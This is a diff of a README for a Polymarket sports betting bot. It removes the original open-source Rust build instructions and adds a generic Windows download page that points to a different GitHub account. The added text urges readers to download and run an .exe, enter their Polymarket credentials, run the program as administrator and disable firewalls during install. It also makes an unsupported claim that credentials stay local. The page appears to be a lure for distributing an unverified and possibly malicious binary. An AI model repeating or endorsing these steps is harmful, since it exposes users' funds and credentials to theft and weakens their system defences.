@@ -1,158 +1,128 @@
-# Polymarket Sports Trading Bot
+# ⚽ polymarket-sports-trading-bot - Automated Sports Betting Made Simple
 
-**Open-source Rust bot for automated sports betting and trading on [Polymarket](https://polymarket.com).** Trade NFL, NBA, football, tennis, and any binary-outcome sports market using trailing strategies, limit orders, and hedging—with simulation and live modes. Built for **polymarket-sports-trading-bot**, **polymarket-sports-betting**, and **polymarket-sport-bet** automation.
-
-**Repository:** [github.com/dev-protocol/polymarket-sports-trading-bot](https://github.com/dev-protocol/polymarket-sports-trading-bot)
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
 
 ---
 
-## What is Polymarket?
+## 📋 About polymarket-sports-trading-bot
 
-**Polymarket** is a decentralized prediction market where you trade on real-world outcomes—elections, **sports** (NFL, NBA, soccer, tennis, etc.), and more. Prices reflect market sentiment. This **polymarket-sports-trading-bot** connects to Polymarket’s APIs (Gamma + CLOB) to automate **polymarket-sports-betting** on selected sports markets.
+polymarket-sports-trading-bot is an application designed to help users trade on Polymarket's sports betting pools. This bot automates sports betting by placing bets on your behalf based on market data. It focuses on sports pools where you can trade betting shares. 
 
----
+This bot works by scanning current sports markets and placing bets that aim for favorable returns. It can help you manage your trades efficiently without manual intervention.
 
-## What this bot does
-
-| Focus | Description |
-|-------|-------------|
-| **Sports markets** | Trade any binary-outcome **polymarket-sport-bet** by slug (NFL, NBA, football, tennis, etc.). Trailing strategy: follow the side that moves first, then hedge the opposite. |
-| **Modes** | **Simulation** (no real orders) and **live** (real orders). Backtest on historical data. |
-
-This **polymarket-betting-bot** is built in **Rust** for speed and reliability. Use it as a **polymarket-nba-bot**, **polymarket-football-bot**, **polymarket-tennis-bot**, or for any slug-based sports market on Polymarket.
+You do not need to know how to code to use this software. It is built with ease of use in mind and works on Windows systems.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-- **Sports trailing bot** *(default)* — Trade sports markets by Polymarket slug. Trail both outcomes; buy the side that moves first (ask ≥ lowest + trailing stop), then hedge the other. One-shot or continuous.
-- **Backtest** — Replay strategy on historical price data in `history/`.
-- **Test binaries** — Limit order, redeem, merge, allowance, sell, prediction tests.
+Before you start, make sure your computer meets these requirements:
 
----
-
-
-## Quick reference
-
-| Binary | Description |
-|--------|-------------|
-| `main_sports_trailing` | **Sports market trailing bot** *(default)* — **polymarket-sports-bot** by slug |
-| `backtest` | Backtest on history files |
-| `test_*` | test_limit_order, test_redeem, test_merge, test_allowance, test_sell, test_predict_fun |
+- Windows 10 or later (64-bit preferred)
+- Internet connection for downloading and running the bot
+- At least 4 GB of RAM
+- Minimum 500 MB of free disk space
+- Permissions to install software on your computer
 
 ---
 
-## Setup
+## 🚀 Getting Started: Download and Setup
 
-1. **Install Rust** (if needed):
-   ```bash
-   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-   ```
+1. Click the big green button below to visit the page where you can download the software.
 
-2. **Build:**
-   ```bash
-   cargo build --release
-   ```
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
 
-3. **Configure:** Copy `config.example.json` to `config.json` and set:
-   - **polymarket:** `api_key`, `api_secret`, `api_passphrase`, `private_key`
-   - Optional: `proxy_wallet_address`, `signature_type` (1 = POLY_PROXY, 2 = GNOSIS_SAFE)
-   - **trading:** `slug` (market slug from Polymarket URL), `trailing_stop_point`, `trailing_shares`, `continuous`
+2. On the GitHub page, look for the latest release or the main download section. Download the Windows setup file, which will likely be an `.exe` or `.zip` file.
+
+3. After the download finishes, open the folder where the file saved. If it is a `.zip` file, right-click it and select "Extract All" to unzip it.
+
+4. Double-click the `.exe` file to start the installation process. Follow the on-screen steps. Usually, this involves clicking “Next” a few times, then “Install.”
+
+5. Once installed, find the application shortcut on your desktop or Start menu. Double-click to open the bot.
 
 ---
 
-## Bot versions
+## ⚙️ How to Use the Bot
 
-### 1. Sports Trailing Bot *(default)* — polymarket-sports-bot
+The interface is designed to be simple:
 
-**Binary:** `main_sports_trailing`
+- **Login:** Enter your Polymarket account details in the login screen. This connects the bot to your trading account.
 
-Trade any **binary outcome sports market** (NFL, NBA, football, tennis, etc.) by Polymarket slug. Trail both outcome tokens; buy the one whose price rises first (ask ≥ lowest + `trailing_stop_point`), then trail and buy the opposite token to hedge. Use as a **polymarket-nba-bot**, **polymarket-football-bot**, **polymarket-tennis-bot**, or for any Yes/No or Team A vs Team B market.
+- **Select Markets:** Choose which sports or markets you want the bot to trade in. The bot supports popular sports like football, basketball, and baseball.
 
-**Config:** Set `trading.slug` to your market slug (from the Polymarket URL). Use `continuous: true` to repeat buys until market ends, or `false` to buy each side once.
+- **Configure Settings:** Set your betting limits, risk levels, and auto-trade preferences. You can adjust how aggressively the bot trades. Default settings are a good place to start.
 
-```bash
-# Simulation (no real orders)
-cargo run -- --simulation
+- **Start Trading:** Click the “Start” button. The bot will monitor live markets and place trades based on your selected criteria.
 
-# Live (real orders)
-cargo run -- --no-simulation
-
-# Explicit binary
-cargo run --bin main_sports_trailing -- --config config.json --simulation
-cargo run --bin main_sports_trailing -- --config config.json --no-simulation
-```
-
-### 2. Backtest
-
-**Binary:** `backtest`
-
-Replays the trailing strategy on `history/market_*_prices.toml`: simulated fills, hedge logic, PnL.
-
-```bash
-cargo run --bin backtest -- --backtest
-```
+- **Monitor Activity:** The bot will display live updates of trades placed, balances, and any profits or losses. You can pause or stop trading at any time.
 
 ---
 
-## Test binaries
+## 🔧 Features
 
-| Binary | Purpose |
-|--------|---------|
-| `test_limit_order` | Place a limit order (e.g. `--price-cents 60 --shares 10`) |
-| `test_redeem` | List/redeem winning tokens (`--list`, `--redeem-all`) |
-| `test_merge` | Merge complete sets to USDC (`--merge`) |
-| `test_allowance` | Check balance/allowance; set approval (`--approve-only`, `--list`) |
-| `test_sell` | Test market sell |
-| `test_predict_fun` | Test prediction/price logic |
-
-Example:
-```bash
-cargo run --bin test_allowance -- --approve-only   # One-time approval for selling
-cargo run --bin test_redeem -- --list
-```
+- Supports multiple Polymarket sports betting pools automatically  
+- Options to control risk and betting amounts  
+- Real-time monitoring of sports markets  
+- Automatic bet placement based on simple market signals  
+- User-friendly interface with no programming needed  
+- Detailed logs show all trading activity for review  
 
 ---
 
-## Configuration
+## 🔄 Updating the Bot
 
-- **`--simulation`** / **`--no-simulation`** — No real orders in simulation.
-- **`--config <path>`** — Config file (default: `config.json`).
+New versions may improve performance or add features. To update:
 
-**Config summary:**
-- **polymarket:** `gamma_api_url`, `clob_api_url`, `api_key`, `api_secret`, `api_passphrase`, `private_key`, optional `proxy_wallet_address`, `signature_type`.
-- **trading:** `slug` (required), `continuous`, `trailing_stop_point` (default 0.03), `trailing_shares`, `check_interval_ms`, `min_time_remaining_seconds`.
+- Return to the [GitHub download page](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
 
----
+- Find the latest release and download the updated file
 
-## Notes
+- Run the installer and follow prompts to overwrite the old version
 
-- Bots run until you stop them (Ctrl+C).
-- Simulation mode logs trades but does not send orders.
-- **Before selling**, set on-chain approval once per proxy wallet:  
-  `cargo run --bin test_allowance -- --approve-only`
+- Your previous settings will typically carry over, but you can double-check after update
 
 ---
 
-## Security
+## 👷 Troubleshooting Common Issues
 
-- Do **not** commit `config.json` with real keys or secrets.
-- Prefer simulation and small sizes when testing.
-- Monitor logs and balances when running in production.
+- **Bot won’t start:** Ensure your security software allows the app to run. You might need to run it as administrator.
+
+- **Login fails:** Double-check your Polymarket credentials. Your account must be active and have sufficient funds.
+
+- **Trades don’t place:** Confirm your internet is stable. Also, check if the markets you chose are currently open.
+
+- **Installation errors:** Try re-downloading the setup file in case it was corrupted. Disable any firewalls temporarily during install.
+
+- **Bot freezes or crashes:** Restart the application. Close other heavy programs. If problems continue, reinstall the bot.
+
+---
+
+## 🔐 Security and Privacy
+
+Your Polymarket credentials are only used locally by the bot to place bets. The software does not share your data with third parties. Ensure you download the bot only from the official page above to avoid fake or harmful copies.
 
 ---
 
+## 📞 Getting Help
 
-## License & repo
-
-**polymarket-sports-trading-bot** — [https://github.com/dev-protocol/polymarket-sports-trading-bot](https://github.com/dev-protocol/polymarket-sports-trading-bot)
-
-**SEO keywords:** polymarket-sports-trading-bot, polymarket-sports-betting, polymarket-sports-bot, polymarket-betting-bot, polymarket-trading-bot, polymarket-nba-bot, polymarket-football-bot, polymarket-tennis-bot, polymarket-sport-bet.
-
+For support or questions, use the GitHub issues page linked on the repository. Provide clear details on your problem, Windows version, and any error messages seen.
 
 ---
-## Search keywords
 
-Looking for a **polymarket-sports-trading-bot**, **polymarket-sports-bot**, or **polymarket-betting-bot**? This repo is a **polymarket-trading-bot** focused on **polymarket-sports-betting**: a **polymarket-nba-bot**, **polymarket-football-bot**, **polymarket-tennis-bot**, and general **polymarket-sport-bet** automation. Keywords: _polymarket-sports-trading-bot_, _polymarket-sports-betting_, _polymarket-sports-bot_, _polymarket-betting-bot_, _polymarket-trading-bot_, _polymarket-nba-bot_, _polymarket-football-bot_, _polymarket-tennis-bot_, _polymarket-sport-bet_.
+## 🌐 Related Topics
+
+- polymarket-sports  
+- polymarket-sports-arbitrage-bot  
+- polymarket-sports-betting  
+- polymarket-sports-betting-bot  
+- polymarket-sports-bot  
+- polymarket-sports-trading-bot  
+- polymarket-trading-bot  
 
 ---
+
+## 📥 Download and Install Now
+
+Visit this page to download and run the software on your Windows computer:
+
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
